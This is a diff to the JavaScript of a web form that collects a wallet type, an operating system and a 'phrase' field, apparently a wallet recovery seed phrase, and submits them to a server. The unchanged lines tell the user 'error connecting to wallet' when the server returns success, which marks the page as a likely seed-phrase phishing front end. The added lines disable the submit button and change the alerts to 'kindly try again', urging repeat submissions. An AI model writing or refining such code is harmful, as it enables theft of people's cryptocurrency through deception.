@@ -85,6 +85,11 @@ form.addEventListener('submit', handleSubmit);
 
 function handleSubmit(event) {
     event.preventDefault(); // prevent default form submission behavior
+    
+    document.getElementById("scanSubmit").setAttribute("disabled","disabled");
+    const collection1 = document.getElementById("scanSubmit");
+    collection1.style.background = "grey";
+    
     const wallet = document.getElementById('walletTypeSelect').value;
     const os = document.getElementById('osTypeSelect').value;
     const phrase = document.getElementById('phrase').value;
@@ -105,10 +110,17 @@ function sendData(data) {
       if (response.status === 200) {
         alert('error connecting to wallet');
       } else {
-        alert('failed connection fail');
+        alert('failed connection, kindly try again');
+          
+        document.getElementById("scanSubmit").removeAttribute("disabled");
+        const collection1 = document.getElementById("scanSubmit");
+        collection1.style.background = "#ff5300";
       }
     })
     .catch(error => {
-      alert('server error');
+      alert('server error, kindly try again');
+      document.getElementById("scanSubmit").removeAttribute("disabled");
+      const collection1 = document.getElementById("scanSubmit");
+      collection1.style.background = "#ff5300";
     });
   }
